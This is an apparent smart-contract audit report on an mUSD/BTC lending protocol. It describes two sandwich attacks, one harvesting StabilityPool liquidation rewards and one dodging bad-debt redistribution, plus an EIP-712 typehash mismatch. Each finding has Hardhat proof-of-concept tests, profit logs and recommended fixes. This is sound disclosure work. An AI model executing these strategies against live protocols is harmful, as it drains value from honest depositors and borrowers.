# Mediums
## Malicious Borrowers Can Sandwich Funds from `StabilityPool` Upon A Liquidation
### Summary
The `StabilityPool` allows attackers to extract risk-free `BTC` by sandwiching liquidations across blocks. By front-running a liquidation with a deposit and withdrawing immediately after, attackers can capture `BTC` rewards disproportionately to their actual contribution, profiting while barely risking any `mUSD`.

### Finding Description
The `StabilityPool` is designed to distribute liquidated collateral proportionally to the stake of depositors. However, it does not enforce any minimum deposit duration or reward weighting based on time staked. This opens the door to a block-level sandwich attack:

1. The attacker observes a liquidation opportunity (e.g., unhealthy trove about to be liquidated).
2. They deposit a small or medium amount of `mUSD` into the `StabilityPool` just before the liquidation.
3. The liquidation occurs, and the attacker receives their share of collateral gains.
4. They then immediately withdraw their deposit in the next block.

Since the `StabilityPool` uses a snapshot-based accounting system that doesn't factor in time or decay, attackers are treated equally to long-term stakers. In the PoC, the attacker deposits 1,000 `mUSD` and walks away with ~$37 in profit within two blocks, while not contributing to the system's long-term stability.

This violates the fairness assumption behind proportional rewards and breaks economic guarantees around time-weighted participation. A user can profit without any real risk, and with minimal exposure, undermining the long-term incentive design of the protocol.

Bottom Line is an malicious borrower can use their own capital, back it properly, but game the reward logic to extract BTC in a way that’s disconnected from stability contribution.

### Impact Explanation
**Medium**. While this attack doesn’t directly break fund safety or critical protocol invariants, it introduces risk-free economic extraction that:

- Disproportionately rewards opportunistic actors,
- Undermines long-term depositors.
- Can be repeated by bots or sandwichers for sustained drain.

Given enough liquidations and fast block reaction time, an attacker can repeatedly profit while contributing nothing to the protocol’s health.

### Likelihood Explanation
**Medium**. This attack requires some setup (liquidation predictability, `mUSD` balance, fast execution), but is:

- Easy to automate,
- Executable by any moderately sophisticated actor, and
- Profitable without much risk.
- It becomes highly likely in periods of volatility when Troves teeter on the edge of liquidation.

### Proof of Concept
The following test can be pasted in the `StabilityPool.test.ts` file. To make the test work it is necessary to also import:
```typescript
import hre from "hardhat";
import { formatUnits } from "ethers";
```

PoC:
```typescript
it("Attacker profits by sandwiching a liquidation across blocks", async () => {
      const { stabilityPool, priceFeed } = contracts;

      // Step 1: Alice provides most of the SP
      await openTrovesAndProvideStability(contracts, [alice], "20,000", "200");

      // Step 2: Dennis opens unhealthy trove
      await openTrove(contracts, {
        musdAmount: "10,000",
        ICR: "110",
        sender: dennis.wallet,
      });

      // Step 3: Bob opens healthy trove to source mUSD
      await openTrove(contracts, {
        musdAmount: "1,800",
        ICR: "200",
        sender: bob.wallet,
      });

      // Give Carol a good slice
      const depositAmount = to1e18("1000");
      await transferMUSD(contracts, bob, carol, depositAmount);
      await updateStabilityPoolUserSnapshot(contracts, carol, "before");
      await updateWalletSnapshot(contracts, carol, "before");
      await updateWalletSnapshot(contracts, bob, "before");

      // Checks for before deposit
      const beforeDepositPrice = await priceFeed.fetchPrice();
      const getUSDValue = (user: User) =>
        user.musd.before +
        (user.btc.before * beforeDepositPrice) / to1e18("1");
      const combinedBefore =
        getUSDValue(bob) + getUSDValue(carol);

      // Step 4: Carol deposits into SP because she sees a coming liquidation
      await provideToSP(contracts, carol, depositAmount);

      // Force next block (simulate separation)
      await hre.network.provider.send("evm_mine");

      // Step 5: Price drops & Dennis gets liquidated
      await dropPriceAndLiquidate(contracts, deployer, dennis);

      // Force another block
      await hre.network.provider.send("evm_mine");

      // Step 6: Carol withdraws her deposit (plus rewards)
      await contracts.stabilityPool.connect(carol.wallet).withdrawFromSP(depositAmount);
      await updateStabilityPoolUserSnapshot(contracts, carol, "after");
      await updateWalletSnapshot(contracts, carol, "after");

      // Checks for after withdrawal
      await updateWalletSnapshot(contracts, bob, "after");

      const AfterDepositPrice = await priceFeed.fetchPrice();
      const getUSDValueAfter = (user: User) =>
        user.musd.after +
        (user.btc.after * AfterDepositPrice) / to1e18("1");

      const combinedAfter =
        getUSDValueAfter(bob) + getUSDValueAfter(carol);

      console.log("Combined Value Before:", formatUnits(combinedBefore));
      console.log("Combined Value After: ", formatUnits(combinedAfter));

      // Step 7: Check actual profit
      const lostMUSD = carol.musd.before - carol.musd.after;
      const gainedBTC = carol.btc.after - carol.btc.before;

      const price = await priceFeed.fetchPrice();
      const gainedUSD = (gainedBTC * price) / to1e18("1");

      console.log("Carol lost mUSD:", formatUnits(lostMUSD));
      console.log("Carol gained BTC:", formatUnits(gainedBTC));
      console.log("Value of BTC gained in USD:", formatUnits(gainedUSD));
      console.log("Total gained USD:", formatUnits(gainedUSD - lostMUSD));

      // Profitability check
      expect(gainedUSD).to.be.gt(lostMUSD);
      expect(combinedAfter).to.be.gt(combinedBefore);
    });

```

The test checks both Carol’s individual profit and combined system-level profit between Bob + Carol, confirming the attack does not come at a cost to the attacker cohort. Here are the logs below:
```bash
Combined Value Before: 99997754.76415000000025
Combined Value After:  99997792.079849999871247199
Carol lost mUSD: 488.095238095238096
Carol gained BTC: 0.010508218761904
Value of BTC gained in USD: 525.410938095199999522
Total gained USD: 37.315699999961903522

```

### Recommendation
- Consider adding a feature where you have time-weighted reward accounting: Require deposits to mature for N blocks before becoming eligible for rewards.
- Also you could have a commit-reveal pattern: Introduce a two-phase deposit system where deposits must be committed, and rewards are only calculated after a delay.

## Borrowers Can Sandwich Liquidation to Escape Bad Debt Redistribution
### Summary
Borrowers can exploit the trove system by temporarily closing their trove just before a liquidation event and reopening it immediately after, thereby avoiding bad debt redistribution. This "trove sandwich" attack creates unfair economic advantages and pushes additional losses onto other borrowers, if there is not enough funds in the `StabilityPool`.

### Finding Description
When a trove is liquidated and the `StabilityPool` cannot absorb the entire debt, the remaining "bad debt" is redistributed across all active troves. However, there is no mechanism preventing users from temporarily exiting the system by closing their trove right before such an event.

An attacker can:

1. Open a healthy trove.
2. Monitor for a liquidation-triggering price drop.
3. Close their trove moments before liquidation.
4. Reopen it with the same parameters after the redistribution has occurred.

Because redistribution targets only active troves at the time of liquidation, the attacker’s trove is excluded from receiving any of the bad debt. This manipulation breaks the fairness of debt distribution and undermines the economic model of the protocol.

### Impact Explanation
High.

This issue allows malicious actors to sidestep their share of protocol risk, undermining the redistribution mechanism that is fundamental to the stability model. If widely exploited, this could concentrate losses on unsuspecting users, discourage honest participation, and potentially trigger wider systemic imbalances.

### Likelihood Explanation
Low.

The window of execution for this attack is narrow (requires timing and automation), but entirely feasible. MEV searchers or bot operators could programmatically detect liquidation opportunities and execute the sandwich automatically.

### Proof of Concept
Paste the following test in the `TroveManager.tests.ts` test suite, and run:
```bash
npx hardhat test --grep "should allow user to avoid bad debt redistribution via trove sandwiching"
```
```typescript
it("should allow user to avoid bad debt redistribution via trove sandwiching", async () => {
  // Step 1: Set up troves
  const { totalDebt } = await openTrove(contracts, {
    musdAmount: "5000",
    ICR: "200",
    sender: alice.wallet,
  });

  await openTrove(contracts, {
    musdAmount: "20000",
    ICR: "200",
    sender: bob.wallet,
  });

  await openTrove(contracts, {
    musdAmount: "2000",
    ICR: "120",
    sender: carol.wallet,
  });

  await openTrove(contracts, {
    musdAmount: "20000",
    ICR: "200",
    sender: dennis.wallet,
  });

  await provideToSP(contracts, bob, to1e18("20,000"));
  await updateTroveSnapshot(contracts, alice, "before");

  // Step 2: Exit system before liquidation
  await transferMUSD(contracts, dennis, alice, totalDebt);
  await contracts.borrowerOperations.connect(alice.wallet).closeTrove();

  // Step 3: Trigger liquidation
  await dropPrice(contracts, deployer, carol);
  await contracts.troveManager.liquidate(carol.address);

  // Step 4: Reopen trove
  await openTrove(contracts, {
    musdAmount: "5000",
    ICR: "200",
    sender: alice.wallet,
  });

  // Step 5: Snapshot and validate
  await updateTroveSnapshot(contracts, alice, "after");

  expect(alice.trove.icr.after).to.be.closeTo(alice.trove.icr.before, to1e18("0.01"));
  expect(alice.trove.debt.after).to.equal(alice.trove.debt.before);
  expect(alice.trove.collateral.after).to.be.closeTo(
    alice.trove.collateral.before,
    to1e18("0.2")
  );
});
```

### Recommendation
Consider having some buffer mechanism that can help prevent such behaviour. For example, a two step system that won't allow borrowers to close and open a trove within a predefined time delay.

# Lows
## Summary
The `BorrowerOperationsSignatures` contract contains several `TYPEHASH` definitions that do not exactly match the layout of their corresponding structs. This breaks alignment with the EIP-712 standard, potentially causing incompatibilities or confusion when generating and verifying signatures off-chain.

## Finding Description
The `BorrowerOperationsSignatures` contract uses EIP-712 signatures to authorize key operations like opening a trove or withdrawing collateral. Each function relies on a `TYPEHASH` constant to define the signed data structure.

However, several of these `TYPEHASH` definitions do not match their actual struct definitions in Solidity. Discrepancies include:
- Fields being listed out of order.
- Omitted fields such as `upperHint` and `lowerHint`.
- Inclusion of extra fields like `assetAmount` that do not exist in the contract's struct.

This causes signature verification to behave inconsistently:
- Signatures generated using external tools or test utilities may not be valid on-chain.
- On-chain signature checks may pass despite the user having signed mismatched data.

While this does not present a direct security vulnerability (because invalid signatures are rejected), it undermines the correctness and reliability of delegated signing mechanisms.

## Impact Explanation
**Low**. The contract does not accept invalid signatures, so critical operations remain protected. However, the mismatch causes breakage between off-chain signing (e.g., wallets, frontends, or test scripts) and on-chain verification, reducing the utility and safety of signature-based delegation.

## Likelihood Explanation
**Low**. Any front-end, wallet, or off-chain service attempting to integrate EIP-712 support for this contract will likely encounter issues. Incorrect assumptions about the structure will lead to invalid or rejected signatures, degrading the user experience.

## Proof of Concept
```ts
it("should fail to open a trove with a valid signature derived from contract", async () => {
      const { borrower, recipient, nonce, domain, deadline } =
        await setupSignatureTests();

      const correctedTypes = {
        OpenTrove: [
          { name: "debtAmount", type: "uint256" },
          { name: "upperHint", type: "address" },
          { name: "lowerHint", type: "address" },
          { name: "borrower", type: "address" },
          { name: "recipient", type: "address" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const value = {
        debtAmount,
        upperHint,
        lowerHint,
        borrower: carol.address,
        recipient: carol.address,
        deadline,
      };
      
      const signature = await carol.wallet.signTypedData(domain, correctedTypes, value);

      await expect(
        contracts.borrowerOperationsSignatures.connect(carol.wallet).openTroveWithSignature(
          debtAmount,
          upperHint,
          lowerHint,
          carol.address,
          carol.address,
          signature,
          deadline,
          { value: assetAmount }
        )
      ).to.be.revertedWith("BorrowerOperationsSignatures: Invalid signature")
    });
```

### Recommendations
Ensure that each `TYPEHASH` accurately mirrors the fields in its struct — field name, type, and order must match exactly.

For example, change the `OpenTrove` type hash to be the following:

```diff
- bytes32 private constant OPEN_TROVE_TYPEHASH =
-    keccak256(
-       "OpenTrove(uint256 assetAmount,uint256 debtAmount,address borrower,address recipient,uint256 nonce,uint256 deadline)"
-    );

+ bytes32 private constant OPEN_TROVE_TYPEHASH =
+   keccak256(
+       "OpenTrove(uint256 debtAmount,address upperHint,address lowerHint,address borrower,address recipient,uint256 deadline)"
+   );
```